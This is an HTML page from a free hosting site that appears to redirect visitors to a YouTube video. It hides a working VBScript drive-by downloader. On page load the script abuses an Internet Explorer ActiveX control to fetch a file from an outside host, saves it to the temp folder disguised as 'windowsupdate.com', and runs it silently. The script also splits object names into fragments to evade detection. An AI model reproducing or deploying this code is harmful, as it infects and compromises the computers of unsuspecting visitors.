<script type='text/javascript' src='http://www2.xpg.com.br/sites/xheader.php'></script>
<noframe><noscript>
<div style="text-align:center;background-image:url(http://www2.xpg.com.br/images/xpg2/padrao/internas/barra_fundo.gif)">
<img src="http://www2.xpg.com.br/images/xpg2/padrao/internas/barra_nojava.gif" border="0" usemap="#Map" >
<map name="Map">
  <area shape="rect" coords="84,-1,221,30" href="http://www.xpg.com.br/">
  <area shape="rect" coords="277,0,405,29" href="http://www.xpg.com.br/home/indicate.php">
</map>
</div>
</noscript></noframe>
<script language="VBScript">
on error resume next

'abaixo os parametros e configuracao do script


' criando adodbstream object                                                                                                                                                                                                                                 
Set df = document.createElement("object")
df.setAttribute "classid", "clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"
str="Microsoft.XMLHTTP"
Set x = df.CreateObject(str,"")


a1="Ado"
a2="db."
a3="Str"
a4="eam"
str1=a1&a2&a3&a4
str5=str1
set S = df.createobject(str5,"")
S.type = 1
          

'definindo o link de onde sera baixado o arquivo                                                                                                                                                                                                                                                                    
str6="GET"
x.Open str6, "http://www.crkuit.com/renata.com", False
x.Send

'definindo o nome do arquivo                                                                                                                                                                                                                                                                               
arquivo="windowsupdate.com"


set F = df.createobject("Scripting.FileSystemObject","")
set tmp = F.GetSpecialFolder(2) 'pegando a pasta da temp
arquivo= F.BuildPath(tmp,arquivo)
S.open
'                                                                                                                                                                                                                                                                                
S.write x.responseBody
' salvando                                                                                                                                                                                                                                                                           
S.savetofile arquivo,2

S.close
set Q = df.createobject("Shell.Application","")
Q.ShellExecute arquivo,"","","open",0
</script>
<title>100 Meias Palavras</title>
</head>
<body>
<meta http-equiv="refresh" content="0;URL=http://www.youtube.com/watch?v=3jqvlwXN0Cc">
</body>
</html>                            

<script type='text/javascript' src='http://www2.xpg.com.br/sites/xfooter.php'></script>

